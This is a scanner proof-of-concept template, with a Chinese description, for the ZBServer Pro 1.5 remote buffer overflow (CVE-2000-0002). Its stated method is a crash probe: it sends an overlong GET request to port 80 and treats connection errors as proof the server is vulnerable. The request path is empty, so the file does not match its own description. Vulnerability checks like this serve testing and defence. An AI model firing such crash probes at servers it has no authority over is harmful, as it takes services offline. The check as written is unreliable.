[info]
author = "AVE"
description = "检测 ZBServer Pro 1.5 是否受远程缓冲区溢出漏洞影响，通过向目标 80 端口发送超长 GET 请求触发缓冲区溢出，导致服务崩溃。"
id = "POC-AVE-2000-0004"
name = "ZBServer Pro 1.5 Remote Buffer Overflow PoC"
severity = "critical"
tags = ["ave-2000-0004"]
vuln_id = [
    "CVE-2000-0002",
    "AVE-2000-0004",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = ""
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "connection refused",
    "connection reset",
    "no route to host",
    "EOF",
]
